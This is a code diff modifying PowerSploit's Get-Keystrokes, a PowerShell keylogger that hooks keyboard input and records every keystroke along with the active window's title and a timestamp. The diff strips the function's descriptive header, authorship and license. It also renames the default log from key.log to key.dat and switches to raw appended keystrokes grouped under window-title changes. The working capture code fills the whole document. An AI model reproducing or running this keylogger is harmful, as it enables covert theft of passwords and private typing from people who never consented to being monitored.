@@ -1,36 +1,10 @@
 function Get-Keystrokes {
-<#
-.SYNOPSIS
-    Logs keys pressed, time and the active window.
-    
-    PowerSploit Function: Get-Keystrokes
-    Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
-    Revised By: Jesse Davis (@secabstraction)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-    
-.PARAMETER LogPath
-    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
-.PARAMETER Timeout
-    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
-.PARAMETER PassThru
-    Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.
-.EXAMPLE
-    Get-Keystrokes -LogPath C:\key.log
-.EXAMPLE
-    Get-Keystrokes -Timeout 20
-    
-.LINK
-    http://www.obscuresec.com/
-    http://www.exploit-monday.com/
-    https://github.com/secabstraction
-#>
+
     [CmdletBinding()] 
     Param (
         [Parameter(Position = 0)]
         [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
-        [String]$LogPath = "$($env:TEMP)\key.log",
+        [String]$LogPath = "$($env:TEMP)\key.dat",
 
         [Parameter(Position = 1)]
         [Double]$Timeout,
@@ -40,12 +14,7 @@ function Get-Keystrokes {
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
-
-    try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
-    catch { throw $_ }
-
-
-
+	
         function local:Get-DelegateType {
             Param (
                 [OutputType([Type])]
@@ -145,6 +114,8 @@ function Get-Keystrokes {
 	    $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
     
         #endregion Imports
+		
+		$WindowTitle0=""
 
         $CallbackScript = {
             Param (
@@ -302,21 +273,30 @@ function Get-Keystrokes {
                 # Get foreground window's title
                 $Title = New-Object Text.Stringbuilder 256
                 $GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)
+				
+				$WindowTitle=$Title.ToString()
+				
+				
+				if($WindowTitle -ne $WindowTitle0)
+				{
+					$TimeStamp = (Get-Date -Format 'MM-dd HH:mm:ss')
+					$OFS = "`r`n"
+					$SPACE ="`t"
+					#$OFS,$TimeStamp,$WindowTitle,$OFS | Out-File -FilePath $LogPath -Append  -Encoding unicode
 
-                # Define object properties
-                $Props = @{
-                    Key = $Key
-                    Time = [DateTime]::Now
-                    Window = $Title.ToString()
-                }
+					[System.IO.File]::AppendAllText($LogPath,$OFS,[System.Text.Encoding]::UNICODE)
+					[System.IO.File]::AppendAllText($LogPath,$TimeStamp,[System.Text.Encoding]::UNICODE)
+					[System.IO.File]::AppendAllText($LogPath,$SPACE,[System.Text.Encoding]::UNICODE)
+					[System.IO.File]::AppendAllText($LogPath,$WindowTitle,[System.Text.Encoding]::UNICODE)
+					[System.IO.File]::AppendAllText($LogPath,$OFS,[System.Text.Encoding]::UNICODE)
 
-                $obj = New-Object psobject -Property $Props
-            
-                # Stupid hack since Export-CSV doesn't have an append switch in PSv2
-                $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]
+					$WindowTitle0 = $WindowTitle
+				}
 
-                #return results
-                Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
+              
+				#$Key | Out-File -FilePath $LogPath -Append  -Encoding unicode -NoNewline
+				[System.IO.File]::AppendAllText($LogPath,$Key,[System.Text.Encoding]::UNICODE)
+				
             }
             return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
         }
